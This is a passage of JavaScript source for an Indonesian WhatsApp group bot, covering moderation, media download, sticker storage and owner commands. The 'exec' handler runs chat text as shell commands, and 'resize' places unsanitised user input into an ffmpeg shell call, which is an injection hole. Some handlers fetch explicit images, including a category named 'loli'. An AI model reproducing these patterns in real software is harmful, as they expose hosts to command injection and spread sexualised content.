if(alasan == undefined) alasan = "Tidak ada"
let Nomer = `${users.split("@")[0]}`
if(_ban.check(Nomer, ban)) return setReply("User sudah di ban sebelumnya")
let Name = await conn.getName(users)
if(ownerNumber.includes(users)) return setReply("Tidak bisa membanned owner")
_ban.add(Name,calender,Nomer,alasan, ban)
setReply( `Berhasil banned ${users.split("@")[0]}`);
} else setReply('Reply atau tag targetnya')
}
break

case 'unban':
case   'delban':
case   'unbanned':{
if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner') 
if (q.startsWith("+")) {
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
if(!_ban.check(woke, ban)) return setReply("User sudah di unban sebelumnya")
_ban.del(woke, ban)             
setReply( `Berhasil unbanned ${woke}`);
} else if(users){
let Nomer =`${users.split("@")[0]}`
if(!_ban.check(Nomer, ban)) return setReply("User sudah di unban sebelumnya")
_ban.del(Nomer, ban)             
setReply(`Berhasil unbanned ${users.split("@")[0]}`);
} else setReply('Reply atau tag targetnya')
}
break

case 'listban':{
let banya = `*List Banned*\nJumlah : ${ban.length}\n\n`
ban.map(function(e, i){
banya +=(i+1)+`. Nomer : wa.me/${e.id}\n└▸ Tanggal : ${e.date}\n└▸ Alasan : ${e.reason} \n\n`            
});
setReply(banya)
}
break

case 'kick': {
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!Input) return setReply("Tag/Mention/Masukan nomer target")
if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
await conn.groupParticipantsUpdate(from, [Input], 'remove').then((res) => setReply(`Berhasil mengeluarkan  ${Input.split("@")[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err)))
}
break

case 'add': {
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if(!Input) return setReply("Tag/Mention/Masukan nomer target")
if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
await conn.groupParticipantsUpdate(from, [Input], 'add').then((res) =>{
if(res[0].status == 200) setReply(`Berhasil menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)
if(res[0].status == 403) setReply(`Gagal menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)
}).catch((err) => setReply(jsonformat(err)))
}
break

case 'demote': 
case    'unadmin':{
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
await conn.groupParticipantsUpdate(from, [users], 'demote').then((res) => setReply(`Sukses Demote ${users}`)).catch((err) => setReply(jsonformat(err)))
}
break

case 'promote':
case     'admin': {
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
await conn.groupParticipantsUpdate(from, [users], 'promote').then((res) => setReply(`Sukses Promote ${users}`)).catch((err) => setReply(jsonformat(err)))
}
break

case 'opentime':
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
conn.groupSettingUpdate(from, 'not_announcement')
setReply(open)
}, timer)
break


case 'closetime':
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
conn.groupSettingUpdate(from, 'announcement')
setReply(close)
}, timer)
break

case 'tr': {
let translate = require('translate-google-api')
let defaultLang = 'en'
let tld = 'cn'
let err = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim()

let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && m.quoted && m.quoted.text) text = m.quoted.text
let result
try {
result = await translate(`${text}`, {to: lang})
} catch (e) {
result = await translate(`${text}`, {to: defaultLang,})
setReply(err)
} finally {
setReply(result[0])
}
}
break

case 'listblock':{
let block = await conn.fetchBlocklist()            
setReply('List Block:\n\n' + `Total: ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`)
}
break
    /*case 'gempanow':{
    const {gempaNow} = await import('@bochilteam/scraper')
let ano = await gempaNow()
console.log(ano)
if(ano.length == 0) return setReply("Tidak ada info terjadi gempa hari ini")
for(let e of ano){
setReply(`Lokasi: ${e.location}\nTanggal: ${e.date}\nKedalaman: ${e.depth}\nMagnitude: ${e.magnitude}\nLatitude: ${e.latitude}\nLongitude:${e.longitude}\n`)
}
}
break*/
    case 'hentai-neko' :
case 'hneko' :
if (isGroup) return setReply('Private chat only.')
    setReply(mess.wait)
 let waifudds = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 const hnekobot = {
image: {url:waifudds.data.url},
caption:`Here you go!`,
}
conn.sendMessage(m.chat, hnekobot, { quoted:m }).catch(err => {
 return('Error!')
})
break
case 'blowjob':{
if (isGroup) return setReply('Private chat only.')
    setReply(mess.wait)
 let waifudds = await axios.get(`https://waifu.pics/api/nsfw/blowjob`)
 const hnekobot = {
image: {url:waifudds.data.url},
caption:`Here you go!`,
}
conn.sendMessage(m.chat, hnekobot, { quoted:m }).catch(err => {
 return('Error!')
})
}
break
    case 'trap' :{
if (isGroup) return setReply('Private chat only.')
    setReply(mess.wait)
 let waifudds = await axios.get(`https://waifu.pics/api/nsfw/trap`)
 const hnekobot = {
image: {url:waifudds.data.url},
caption:`Here you go!`,
}
conn.sendMessage(m.chat, hnekobot, { quoted:m }).catch(err => {
 return('Error!')
})
    }
break
case 'hentai-waifu' :
      case 'hentai':
case 'nwaifu': 
if (isGroup) return setReply('Private chat only.')
setReply(mess.wait)
 let waifuddk = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const nwaifubot = {
image: {url:waifuddk.data.url},
caption:`${command}`,
}
conn.sendMessage(m.chat, nwaifubot, { quoted:m }).catch(err => {
 return('Error!')
})
break
    case 'loli': 
case 'milf': 
case 'husbu': 
case 'cosplay': 
case 'wallml':{
if (!isGroup) return setReply(mess.only.group)
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let kentir = await getBuffer(wipi)                             
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `Next photo`},type:1}]                            
conn.sendMessage(from, { image: kentir, caption: `*${mess.success}*`},{ quoted: dev })
}
break  
case 'waifu':{
if (!isGroup) return setReply(mess.only.group)
let wipu = (await axios.get(`https://api.waifu.pics/sfw/waifu`)).data
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next photo" }, type: 1 }]
conn.sendMessage(from, { image: wipu, caption: `*${mess.success}*`},  { quoted: dev })
}
break 
case 'neko':{
if (!isGroup) return setReply(mess.only.group)
let waifudd = (await axios.get(`https://waifu.pics/api/sfw/neko`)).data
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next photo" }, type: 1 }]
conn.sendMessage(from, {image: waifudd, caption: `*${mess.success}*`},{ quoted: dev })
}
break   
case 'animesad':{
if (!isGroup) return setReply(mess.only.group)
let waifudd = (await axios.get(`https://waifu.pics/api/sfw/cry`)).data
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next photo" }, type: 1 }]
conn.sendMessage(from, {image: waifudd, caption: `*${mess.success}*`}, { quoted: dev })
}
break  
case 'animekill':{
if (!isGroup) return setReply(mess.only.group)
let waifudd = (await axios.get(`https://waifu.pics/api/sfw/kill`)).data
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next photo" }, type: 1 }]
conn.sendMessage(from, {image: waifudd, caption: `*${mess.success}*`}, { quoted: dev })
}
break  
case 'animelick':{
if (!isGroup) return setReply(mess.only.group)
let waifudd = (await axios.get(`https://waifu.pics/api/sfw/lick`)).data
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next photo" }, type: 1 }]
conn.sendMessage(from, {image: waifudd, caption: `*${mess.success}*`}, { quoted: dev })
}
break 
case 'animebite':{
if (!isGroup) return setReply(mess.only.group)
let waifudd = (await axios.get(`https://waifu.pics/api/sfw/bite`)).data
var but = [{buttonId: `${command}`, buttonText: { displayText: "Next photo" }, type: 1 }]
conn.sendMessage(from, {image: waifudd, caption: `*${mess.success}*`}, { quoted: dev })
}
break   
    //NSFW
    /*
case 'chiisaihentai':
case 'trap':
case 'blowjob':
case 'yaoi':
case 'ecchi':
case 'hentai':
case 'ahegao':
case 'hololewd':
case 'sideoppai':
case 'animefeets':
case 'animebooty':
case 'animethighss':
case 'hentaiparadise':
case 'animearmpits':
case 'hentaifemdom':
case 'lewdanimegirls':
case 'biganimetiddies':
case 'animebellybutton':
case 'hentai4everyone':{
if (!isGroup) return setReply(mess.only.group)
let buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apikey}`)   
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `Next photo`},type:1}]                            
xdev.sendMessage(from, {image: buffer, caption: mess.success, buttons: buttons ,footer: `Hasil pencarian dari ${command}`}, { quoted: dev }).catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break
case 'bj':
case 'ero':
case 'cum':
case 'feet':
case 'yuri':
case 'lewd':
case 'feed':
case 'eron':
case 'solo':
case 'gasm':
case 'poke':
case 'anal':
case 'holo':
case 'tits':
case 'kuni':
case 'erok':
case 'baka':
case 'solog':
case 'feetg':
case 'lewdk':
case 'waifu2':
case 'pussy':
case 'femdom':
case 'cuddle':
case 'eroyuri':
case 'cum_jpg':
case 'erofeet':
case 'holoero':
case 'classic':
case 'erokemo':
case 'fox_girl':
case 'futanari':
case 'lewdkemo':
case 'pussy_jpg':
case 'kemonomimi':
case 'nsfw_avatar':{
if (!isGroup) return setReply(mess.only.group)
let buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}`)   
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `Next photo`},type:1}]                            
xdev.sendMessage(from, { image: buffer, caption: mess.success, buttons: buttons ,footer: `Hasil pencarian dari ${command}`}, { quoted: dev }).catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break
  case 'ass':
	case 'ahegao':
	case 'bdsm':
	case 'blowjob2':
	case 'cuckold':
	case 'cum':
	case 'ero':
	case 'femdom':
	case 'foot':
	case 'gangbang':
	case 'glasses':	 
	case 'jahy':
	case 'masturbation':
	case 'neko':
	case 'orgy':
	case 'panties':
	case 'pussy':
	case 'thighs':
	case 'yuri':
	case 'mobilewall':{ 
	if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!') 
	  setReply(mess.wait)
    try{
    let anu = await getBuffer(`https://api.zahwazein.xyz/api/morensfw/${command}?apikey=${apizenz}`)
		const nwaifubot = {

}
conn.sendMessage(m.chat, {image: anu,caption:`${command}`}, { quoted:m })
    } catch(err){
setReply(`*Error* coba lagi nanti!!`)
}
}
		break
case 'naruto':
case 'shota':
case 'akira':
case 'akiyama':
case 'ana':
case 'asuna':
case 'ayuzawa':
case 'boruto':
case 'chiho':
case 'chitoge':
case 'deidara':
case 'eba':
case 'elaina':
case 'emilia':
case 'erza':
case 'gremory':
case 'hestia':
case 'hinata':
case 'isuzu':
case 'itachi':
case 'itori':
case 'kagura':
case 'kakasih':
case 'kaori':
case 'keneki':
case 'kotori':
case 'kurumi':
case 'madara':
case 'mikasa':
case 'miku':
case 'minato':
case 'nezuko':
case 'rize':
case 'sagiri':
case 'sakura':
case 'sasuke':
case 'shina':
case 'shinka':
case 'shinomiya':
case 'shizuka':
case 'tejina':
case 'toukachan':
case 'tsunade':
case 'yotsuba':
case 'yuki':
case 'yumeko':{
  if (!isGroup) return setReply(mess.only.group)
try{
setReply(mess.wait)
buffer = await getBuffer(`https://api.ibeng.tech/api/wallpaper/${command}?apikey=${apibeng}`)
let Teks = mess.success
conn.sendButImage(from, Teks, wm, buffer, [                      
{
buttonId: `${prefix+command}`,
buttonText: {
displayText: `LAGI`,
},
type: 1,
},
],{quoted:m});
} catch (err){
console.log(err)
setReply("Error dalam pengunduhan media")
}
}
break*/
 case 'anime':
    if (!isGroup) return setReply(mess.only.group)
setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
imageToBase64(pjr)
.then((response) => {
media =  Buffer.from(response, 'base64');
conn.sendMessage(from,{ image: media,caption:'NIH' },{quoted:dev})
}
)
.catch((error) => {
console.log(error); 
}
)
});
break  
  case 'cecan':{
  if (!isGroup) return setReply(mess.only.group)
setReply(mess.wait)
var query = ["cecan hd","cecan indo","cewe cantik", "cewe aesthetic", "cecan aesthetic"]
var data = await pinterest(pickRandom(query))
    const nwaifubott = {
image: {url: pickRandom(data.result)},
caption:`${command}`,
}
conn.sendMessage(m.chat, nwaifubott, { quoted:m })
}
break
  

    
case 'cogan':{
if (!isGroup) return setReply(mess.only.group)
setReply(mess.wait)
var query = ["cogan hd","cogan indo","cowo ganteng","handsome boy","hot boy","oppa","cowo aesthetic","cogan aesthetic"]
var data = await pinterest(pickRandom(query))
const nwaifubott = {
image: {url: pickRandom(data.result)},
caption:`${command}`,
}
conn.sendMessage(m.chat, nwaifubott, { quoted:m })
}
break  
  /*  case 'faktaunik':{
setReply(mess.wait)
let anu = await fetchJson(`https://violetics.pw/api/information/faktaunik?apikey=${apiKey}`, {method: 'get'})
if (anu.status == 400 || anu.isError == true) return setReply(`${anu.message}`)
setReply(`${jsonformat(anu.result)}`)
    }
        break*/
    case 'pinterest': case 'pin':
    if (!isGroup) return setReply(mess.only.group)
if (args.length < 2) return reply(`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`)
reply(mess.wait)
var jumlah;
if (q.includes('--')) jumlah = q.split('--')[1]
pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
if (q.includes('--')) {
if (data.result.length < jumlah) {
jumlah = data.result.length
reply(`Hanya ditemukan ${data.result.length}, foto segera dikirim`)
}
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(from, { image: { url: data.result[i] }})
}
} else {
var but = [{buttonId: `${command} ${q}`, buttonText: { displayText: 'Next Photo' }, type: 1 }]
conn.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: dev })
}
})
break
    case 'take': case 'wm':
    if (!isGroup) return setReply(mess.only.group)
if (isImage || isQuotedImage|| isQuotedSticker) {
try{
let ahuh = args.join(' ').split('|')
let satu = ahuh[0] !== '' ? ahuh[0] : `${fake}`
let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await conn.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: satu, // The pack name
author: dua, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await conn.sendMessage(from,{sticker: nah},{quoted: dev})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
console.log(err)
}
}
break
    case 'tourl': {
    if (!isGroup) return setReply(mess.only.group)
setReply(mess.wait)
      try{
let media = await conn.downloadAndSaveMediaMessage(quoted)
if (isQuotedImage) {
let anu = await TelegraPh(media)
setReply(util.format(anu))
} else if (isQuotedVideo || isQuotedAudio || isQuotedSticker) {
let anu = await UploadFileUgu(media)
setReply(util.format(anu))
}
await fs.unlinkSync(media)
        } catch(err){
setReply(`Reply media nya!!`)
      }
}
break	
case 'revoke':
if (!isGroup) return setReply(mess.only.group)
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
await conn.groupRevokeInvite(from).then( res => {
setReply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break

case 'hidetag':
if (!isGroup) return setReply(mess.only.group)
if (!isGroupAdmins && !isOwner) return m.reply(mess.only.admin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
break


case 'ytmp4':
if (!isGroup) return setReply(mess.only.group)
try{
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply(mess.scrap)

if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}

let link =`https://youtube.com/watch?v=${videoId}`
let anu = await yts(link)
if(anu.all.length == "0") return setReply("Video tidak di temukan")
let info = await ytdl.getInfo(link);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE VIDEO DOWNLOADER*

📂 Title : ${anu.all[0].title}
💾 Ext : 360p
📄 Size : ${FileSize(format.contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
🌎 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
📹 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
  downloadMp4(q)
  await sleep(3000)
await conn.sendMessage(from, {image: {url: anu.all[0].image}, caption: teks},{quoted: m})
} catch(err){
setReply(`${err}`)
}
break



case 'ytmp3':
if (!isGroup) return setReply(mess.only.group)
{
if(!q) return setReply("Masukan link youtube")
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply(mess.scrap)
let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}
let link =`https://youtube.com/watch?v=${videoId}`
let anu = await yts(link)
if(anu.all.length == "0") return setReply("Musik tidak di temukan")
try{
var foto = `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg`
} catch (err){
var foto = anu.all[0].image
}

try{
let info = await ytdl.getInfo(link);
let format = ytdl.filterFormats(info.formats, 'audioonly');
if(Number(format.contentLength) > 20000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE AUDIO DOWNLOADER*

📂 Title : ${info.videoDetails.title}
📄 Size : ${FileSize(format[0].contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
📊 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
👤 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
  downloadMp3(q)
  await sleep(3000)
await conn.sendMessage(from, {image: {url: foto}, caption: teks},{quoted: m})
} catch(err){
setReply(err)
}
}
break



case 'addstik':{
const client = require('filestack-js').init(fileStackApi)
if(!isQuotedSticker) return setReply("Reply sticker")
if(!q) return setReply("Nama stickernya apa?")
if(db.data.sticker[q]) return setReply("Nama tersebut sudah ada di dalam database")
let media = await conn.downloadAndSaveMediaMessage(quoted, q)
await client.upload(media, {}, { filename: q }, {}).then(data => {
db.data.sticker[q] = {
name: data._file.name,
id: data.handle,
size: FileSize(data._file.size),
link: data.url
}
})
let teks = `Berhasil menambahkan sticker
ke dalam database dengan nama *${q}*`
await setReply(teks)
await fs.unlinkSync(media)
}
break 


case 'delstik':{
if(!m.key.fromMe & !isOwner) return setReply('Only owner')
if (!q) return setReply("Masukan query")
try {
if(!db.data.sticker[q]) return setReply("Nama tersebut tidak ada di dalam data base")
delete db.data.sticker[q]
setReply(`Succes delete sticker ${q}!`)
} catch (err) {
console.log(err)
setReply(`Gagal delete sticker ${q}!`)
}
}
break

case 'getallstik':
let stiker1 = Object.keys(db.data.sticker)
for (let jid of stiker1){
await conn.sendMessage(from, {sticker: {url: db.data.sticker[jid].link }})
await sleep(1000)
}
break


case 'addvn':{
const client = require('filestack-js').init(fileStackApi);
if(!isQuotedAudio) return setReply("Reply audio")
if(!q) return setReply("Nama audionya apa?")
if(db.data.audio[q]) return setReply("Nama tersebut sudah ada di dalam database")
let media = await conn.downloadAndSaveMediaMessage(quoted, q)
await client.upload(media, {}, { filename: q }, {}).then(data => {
db.data.audio[q] = {
name: data._file.name,
id: data.handle,
size: FileSize(data._file.size),
link: data.url
}
})
let teks = `Berhasil menambahkan audio
ke dalam database dengan nama *${q}*`
await setReply(teks)
await fs.unlinkSync(media)
}
break 


case 'delvn':{
if (!isOwner) return onlyOwner()
try {
if(!db.data.audio[q]) return setReply("Nama tersebut tidak ada di dalam data base")
delete db.data.audio[q]
setReply(`Sukses delete vn ${q}`)
} catch (err){
console.log(err)
setReply('eror kak')
}
}
break


case 'addkick':{
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
let grup = db.data.kickon[from]
let number = Input.split("@")[0]
if(grup){
if(grup.includes(number)) return setReply("Target sudah ada di database")
grup.push(number)
setReply(`Berhasil memasukan ${number} ke dalam target kick`)
} else {
db.data.kickon[from] = []
grup.push(number)
let teks =`Berhasil memasukan ${number} ke dalam target kick
dan telah menandai user sebagai user biadap`
setReply(teks)
}
}
break 
    
case 'delkick':{
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
let grup = db.data.kickon[from]
if(!grup) return setReply("Gunakan fitur addkick terlebih dahulu")
let number = Input.split("@")[0]
grup.splice(grup.indexOf(number,1))
setReply("Berhasil menghapus user dari target kick")
}
break

case 'listkick':{
let kick = db.data.kickon[from]
if(!kick) return setReply("Group ini tidak memiliki listkick")
let banya = `*List Kick*\nJumlah : ${kick.length}\n\n`
kick.map(function(e, i){
banya +=(i+1)+`. Nomer : wa.me/${e}\n\n`            
});
setReply(banya)
}
break    

case 'resize':
if (!isGroup) return setReply(mess.only.group)
if (isQuotedImage || isImage) {
if(!q) return setReply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
setReply(mess.wait)
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar}  ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await conn.sendMessage(from, {mimetype: 'image/jpeg', image: buffer453, caption: `Nih ${q}`}, { quoted: m })
fs.unlinkSync(ran)
})
} else {
setReply("Reply Imagenya")
}
break    
    

    
case 'setnamebot':
if (!isOwner) return onlyOwner()
setReply(`Berhasil mengubah nama bot ke ${q}`)
fake = `${q}`
break 


case 'update': {
const lala = JSON.parse(fs.readFileSync('./package.json'))
let listSerch = []
let listmodule = Object.keys(lala.dependencies)
let nono = Object.entries(lala.dependencies)
let teskd = `\nResult From *Package.json*\n\n*Select any module*`
for (let i of nono) {
listSerch.push({
title: i[0],
rowId: `${prefix}listversion npm view ${i[0]} versions --json`,
description: `${i[1]}`
})
}
const sections = [
{
title: "Total Module " + listmodule.length,
rows: listSerch
}
]
const listMessage = {
text: teskd,
footer: copyright,
title: `*Update Dependencies*`,
buttonText: "FOUND",
sections
}
conn.sendMessage(from, listMessage, {quoted: m})
}
break 

case  'listversion':{
if (!itsMe && !isOwner) return onlyOwner()
exec(q, async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
let listSerch = []

let teskd = `\nSilakan pilih versi module yang ingin di install\n`
let module = q.split('view')[1].replace(" versions",'').replace(' --json','').replace(' ','')

let yaya = JSON.parse(stdout)

// Log(yaya)
for (let i of yaya) {

listSerch.push({
title: module,
rowId: `${prefix}exec npm i ${module}@${i}`,
description: `🔖 V${i}`
})
}

if(module.includes("@adiwajshing/baileys") || module.includes("baileys")){
listSerch.push({
title: module,
rowId: `${prefix}exec npm i ${module}@https://github.com/officialdittaz/BaileysFix`,
description: `🔖 github:officialdittaz/BaileysFix`
},{
title: module,
rowId: `${prefix}exec npm i ${module}@https://github.com/amiruldev20/baileys`,
description: `🔖 github:amiruldev20/baileys`
})

}
const sections = [
{
title: "Total Version " + yaya.length,
rows: listSerch
}
]
const listMessage = {
text: teskd,
footer: copyright,
title: `*List Version*`,
buttonText: "TAP",
sections
}
conn.sendMessage(from, listMessage, {quoted: m})

})
}
break

case 'exec':{
if (!itsMe && !isOwner) return onlyOwner()
await setReply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
if (stdout) {
await setReply(`${stdout}`)
let teks = `Berhasil menginstall module ${q.replace("npm i","")}`
let mok = [{"buttonId": `${prefix}restart`,"buttonText": {"displayText": `Restart`},"type": "RESPONSE"}]
let tolol = {
text: teks,
footer: `${copyright}`,
buttons: mok,
headerType: 1
}
await conn.sendMessage(from, tolol , {quoted: m})
}
})
}
break
    
case 'uninstall': {
if (!itsMe && !isOwner) return onlyOwner()
const lala = JSON.parse(fs.readFileSync('./package.json'))

let listSerch = []
let listmodule = Object.keys(lala.dependencies)
let nono = Object.entries(lala.dependencies)
let teskd = `\nResult From *Package*\n\n*Select any module*`
for (let i of nono) {
listSerch.push({
title: i[0],
rowId: `${prefix}$ npm uninstall ${i[0]}`,
description: `${i[1]}`
})
}
const sections = [
{
title: "Total Module " + listmodule.length,
rows: listSerch
}
]
const listMessage = {
text: teskd,
footer: copyright,
title: `*Uninstall Dependencies*`,
buttonText: "FOUND",
sections
}
conn.sendMessage(from, listMessage, {quoted: m})
}
break


case 'blockcmd':
if (!isOwner) return onlyOwner()
if(!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
if (_blockcmd.check(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
_blockcmd.add(q,listcmdblock)         
setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
break

case 'unblockcmd':
try{
if (!isOwner) return onlyOwner()
if(!q) return setReply("Textnya mana cih")
if (!_blockcmd.check(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
_blockcmd.del(q, listcmdblock)        
setReply(`Berhasil unblock command 「 *${q}* 」`)
} catch (err) {
setReply("Bjirr error, keknya ada yang error")
}
break


case 'addowner':{
if (!q) return setReply(`Mana nomer nya??`)
if (!isOwner) return onlyOwner()
if (!isGroup) return setReply(mess.only.group)
if(_data.checkDataId("owner", Input,  DataId)) return setReply("User sudah menjadi owner")
if(!_data.checkDataName("owner", Input, DataId)) { await createDataId("owner", DataId) }
_data.addDataId(Input, "owner", DataId)
setReply(`Berhasil menambahkan ${Input} ke daftar owner`)
}
break

case 'delowner':
if (!q) return setReply(`Mana nomer nya??`)
if (!isOwner) return onlyOwner()
try {
if(!_data.checkDataId("owner", Input, DataId)) return setReply(`User bukan owner`)
_data.removeDataId ("owner", Input, DataId)
setReply(`Berhasil menghapus ${Input.split("@")[0]} ke daftar owner`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break


case 'liststik':{
let teks = '*Sticker list :*\n\n'
for (let awokwkwk of Object.keys(db.data.sticker)) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${Object.keys(db.data.sticker).length}*`
setReply(teks)
}
break



case 'listvn':
{
let teks = '*List Vn:*\n\n'
for (let awokwkwk of Object.keys(db.data.audio)) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total ada : ${Object.keys(db.data.audio).length}*`
teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
